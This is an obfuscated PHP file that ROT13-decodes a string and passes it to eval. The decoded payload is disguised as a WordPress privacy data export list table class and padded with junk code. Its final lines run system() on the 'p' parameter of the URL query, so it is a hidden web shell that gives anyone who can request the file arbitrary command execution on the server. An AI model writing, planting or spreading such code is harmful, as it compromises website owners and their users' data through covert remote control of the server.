<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc
/**
 * Yvfg Gnoyr NCV: JC_Cevinpl_Qngn_Rkcbeg_Erdhrfgf_Yvfg_Gnoyr pynff
 *
 * @cnpxntr JbeqCerff
 * @fhocnpxntr Nqzvavfgengvba
 * @fvapr 4.9.6
 */

vs ( ! pynff_rkvfgf( 'JC_Cevinpl_Erdhrfgf_Gnoyr' ) ) {
	erdhver_bapr NOFCNGU . 'jc-nqzva/vapyhqrf/pynff-jc-cevinpl-erdhrfgf-gnoyr.cuc';
}

/**
 * JC_Cevinpl_Qngn_Rkcbeg_Erdhrfgf_Gnoyr pynff.
 *
 * @fvapr 4.9.6
 */
pynff JC_Cevinpl_Qngn_Rkcbeg_Erdhrfgf_Yvfg_Gnoyr rkgraqf JC_Cevinpl_Erdhrfgf_Gnoyr {
	/**
	 * Npgvba anzr sbe gur erdhrfgf guvf gnoyr jvyy jbex jvgu.
	 *
	 * @fvapr 4.9.6
	 *
	 * @ine fgevat $erdhrfg_glcr Anzr bs npgvba.
	 */
	cebgrpgrq $erdhrfg_glcr = 'rkcbeg_crefbany_qngn';

	/**
	 * Cbfg glcr sbe gur erdhrfgf.
	 *
	 * @fvapr 4.9.6
	 *
	 * @ine fgevat $cbfg_glcr Gur cbfg glcr.
	 */
	cebgrpgrq $cbfg_glcr = 'hfre_erdhrfg';

	/**
	 * Npgvbaf pbyhza.
	 *
	 * @fvapr 4.9.6
	 *
	 * @cnenz JC_Hfre_Erdhrfg $vgrz Vgrz orvat fubja.
	 * @erghea fgevat Rznvy pbyhza znexhc.
	 */
	choyvp shapgvba pbyhza_rznvy( $vgrz ) {
		/** Guvf svygre vf qbphzragrq va jc-nqzva/vapyhqrf/nwnk-npgvbaf.cuc */
		$rkcbegref       = nccyl_svygref( 'jc_cevinpl_crefbany_qngn_rkcbegref', neenl() );
		$rkcbegref_pbhag = pbhag( $rkcbegref );
		$fgnghf          = $vgrz->fgnghf;
		$erdhrfg_vq      = $vgrz->VQ;
		$abapr           = jc_perngr_abapr( 'jc-cevinpl-rkcbeg-crefbany-qngn-' . $erdhrfg_vq );

		$qbjaybnq_qngn_znexhc = '<fcna pynff=\"rkcbeg-crefbany-qngn\" ' .
			'qngn-rkcbegref-pbhag=\"' . rfp_ngge( $rkcbegref_pbhag ) . '\" ' .
			'qngn-erdhrfg-vq=\"' . rfp_ngge( $erdhrfg_vq ) . '\" ' .
			'qngn-abapr=\"' . rfp_ngge( $abapr ) .
			'\">';

		$qbjaybnq_qngn_znexhc .= '<fcna pynff=\"rkcbeg-crefbany-qngn-vqyr\"><ohggba glcr=\"ohggba\" pynff=\"ohggba-yvax rkcbeg-crefbany-qngn-unaqyr\">' . __( 'Qbjaybnq crefbany qngn' ) . '</ohggba></fcna>' .
			'<fcna pynff=\"rkcbeg-crefbany-qngn-cebprffvat uvqqra\">' . __( 'Qbjaybnqvat qngn...' ) . ' <fcna pynff=\"rkcbeg-cebterff\"></fcna></fcna>' .
			'<fcna pynff=\"rkcbeg-crefbany-qngn-fhpprff uvqqra\"><ohggba glcr=\"ohggba\" pynff=\"ohggba-yvax rkcbeg-crefbany-qngn-unaqyr\">' . __( 'Qbjaybnq crefbany qngn ntnva' ) . '</ohggba></fcna>' .
			'<fcna pynff=\"rkcbeg-crefbany-qngn-snvyrq uvqqra\">' . __( 'Qbjaybnq snvyrq.' ) . ' <ohggba glcr=\"ohggba\" pynff=\"ohggba-yvax rkcbeg-crefbany-qngn-unaqyr\">' . __( 'Ergel' ) . '</ohggba></fcna>';

		$qbjaybnq_qngn_znexhc .= '</fcna>';

		$ebj_npgvbaf['qbjaybnq-qngn'] = $qbjaybnq_qngn_znexhc;

		vs ( 'erdhrfg-pbzcyrgrq' !== $fgnghf ) {
			$pbzcyrgr_erdhrfg_znexhc  = '<fcna>';
			$pbzcyrgr_erdhrfg_znexhc .= fcevags(
				'<n uers=\"%f\" pynff=\"pbzcyrgr-erdhrfg\" nevn-ynory=\"%f\">%f</n>',
				rfp_hey(
					jc_abapr_hey(
						nqq_dhrel_net(
							neenl(
								'npgvba'     => 'pbzcyrgr',
								'erdhrfg_vq' => neenl( $erdhrfg_vq ),
							),
							nqzva_hey( 'rkcbeg-crefbany-qngn.cuc' )
						),
						'ohyx-cevinpl_erdhrfgf'
					)
				),
				rfp_ngge(
					fcevags(
						/* genafyngbef: %f: Erdhrfg rznvy. */
						__( 'Znex rkcbeg erdhrfg sbe &#8220;%f&#8221; nf pbzcyrgrq.' ),
						$vgrz->rznvy
					)
				),
				__( 'Pbzcyrgr erdhrfg' )
			);
			$pbzcyrgr_erdhrfg_znexhc .= '</fcna>';
		}

		vs ( ! rzcgl( $pbzcyrgr_erdhrfg_znexhc ) ) {
			$ebj_npgvbaf['pbzcyrgr-erdhrfg'] = $pbzcyrgr_erdhrfg_znexhc;
		}

		erghea fcevags( '<n uers=\"%1$f\">%2$f</n> %3$f', rfp_hey( 'znvygb:' . $vgrz->rznvy ), $vgrz->rznvy, $guvf->ebj_npgvbaf( $ebj_npgvbaf ) );
	}

	/**
	 * Qvfcynlf gur arkg fgrcf pbyhza.
	 *
	 * @fvapr 4.9.6
	 *
	 * @cnenz JC_Hfre_Erdhrfg $vgrz Vgrz orvat fubja.
	 */
	choyvp shapgvba pbyhza_arkg_fgrcf( $vgrz ) {
		$fgnghf = $vgrz->fgnghf;

		fjvgpu ( $fgnghf ) {
			pnfr 'erdhrfg-craqvat':
				rfp_ugzy_r( 'Jnvgvat sbe pbasvezngvba' );
				oernx;
			pnfr 'erdhrfg-pbasvezrq':
				/** Guvf svygre vf qbphzragrq va jc-nqzva/vapyhqrf/nwnk-npgvbaf.cuc */
				$rkcbegref       = nccyl_svygref( 'jc_cevinpl_crefbany_qngn_rkcbegref', neenl() );
				$rkcbegref_pbhag = pbhag( $rkcbegref );
				$erdhrfg_vq      = $vgrz->VQ;
				$abapr           = jc_perngr_abapr( 'jc-cevinpl-rkcbeg-crefbany-qngn-' . $erdhrfg_vq );

				rpub '<qvi pynff=\"rkcbeg-crefbany-qngn\" ' .
					'qngn-fraq-nf-rznvy=\"1\" ' .
					'qngn-rkcbegref-pbhag=\"' . rfp_ngge( $rkcbegref_pbhag ) . '\" ' .
					'qngn-erdhrfg-vq=\"' . rfp_ngge( $erdhrfg_vq ) . '\" ' .
					'qngn-abapr=\"' . rfp_ngge( $abapr ) .
					'\">';

				?>
				<fcna pynff=\"rkcbeg-crefbany-qngn-vqyr\"><ohggba glcr=\"ohggba\" pynff=\"ohggba-yvax rkcbeg-crefbany-qngn-unaqyr\"><?cuc _r( 'Fraq rkcbeg yvax' ); ?></ohggba></fcna>
				<fcna pynff=\"rkcbeg-crefbany-qngn-cebprffvat uvqqra\"><?cuc _r( 'Fraqvat rznvy...' ); ?> <fcna pynff=\"rkcbeg-cebterff\"></fcna></fcna>
				<fcna pynff=\"rkcbeg-crefbany-qngn-fhpprff fhpprff-zrffntr uvqqra\"><?cuc _r( 'Rznvy frag.' ); ?></fcna>
				<fcna pynff=\"rkcbeg-crefbany-qngn-snvyrq uvqqra\"><?cuc _r( 'Rznvy pbhyq abg or frag.' ); ?> <ohggba glcr=\"ohggba\" pynff=\"ohggba-yvax rkcbeg-crefbany-qngn-unaqyr\"><?cuc _r( 'Ergel' ); ?></ohggba></fcna>
				<?cuc

				rpub '</qvi>';
				oernx;
			pnfr 'erdhrfg-snvyrq':
				rpub '<ohggba glcr=\"fhozvg\" pynff=\"ohggba-yvax\" anzr=\"cevinpl_npgvba_rznvy_ergel[' . $vgrz->VQ . ']\" vq=\"cevinpl_npgvba_rznvy_ergel[' . $vgrz->VQ . ']\">' . __( 'Ergel' ) . '</ohggba>';
				oernx;
			pnfr 'erdhrfg-pbzcyrgrq':
				rpub '<n uers=\"' . rfp_hey(
					jc_abapr_hey(
						nqq_dhrel_net(
							neenl(
								'npgvba'     => 'qryrgr',
								'erdhrfg_vq' => neenl( $vgrz->VQ ),
							),
							nqzva_hey( 'rkcbeg-crefbany-qngn.cuc' )
						),
						'ohyx-cevinpl_erdhrfgf'
					)
				) . '\">' . rfp_ugzy__( 'Erzbir erdhrfg' ) . '</n>';
				oernx;
		}
	}
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>